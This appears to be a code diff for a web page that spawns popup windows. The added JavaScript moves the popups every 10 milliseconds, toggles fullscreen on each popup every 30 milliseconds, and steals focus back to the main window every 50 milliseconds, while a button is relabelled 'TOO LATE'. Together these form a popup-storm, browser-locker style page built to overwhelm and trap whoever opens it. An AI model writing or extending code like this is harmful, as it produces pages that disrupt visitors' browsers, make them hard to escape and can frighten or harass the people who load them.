@@ -111,6 +111,9 @@
                 const randomX = Math.random() * (screen.width - 400);
                 const randomY = Math.random() * (screen.height - 300);
                 popup.moveTo(randomX, randomY);
+                
+                // Keep main window focused
+                window.focus();
             }
         }
 
@@ -122,6 +125,24 @@
                     popup.moveTo(randomX, randomY);
                 }
             });
+        }
+
+        let isFullscreen = false;
+        function toggleFullscreen() {
+            activePopups.forEach(popup => {
+                if (popup && !popup.closed) {
+                    try {
+                        if (isFullscreen) {
+                            popup.document.exitFullscreen();
+                        } else {
+                            popup.document.documentElement.requestFullscreen();
+                        }
+                    } catch(e) {
+                        // Fullscreen may not be allowed
+                    }
+                }
+            });
+            isFullscreen = !isFullscreen;
         }
 
         function createAlerts() {
@@ -193,6 +214,14 @@
             
             // Move popups extremely fast
             setInterval(movePopups, 10);
+            
+            // Toggle fullscreen extremely fast
+            setInterval(toggleFullscreen, 30);
+            
+            // Keep main window focused continuously
+            setInterval(() => {
+                window.focus();
+            }, 50);
             
             // Change button text
             button.textContent = 'TOO LATE';
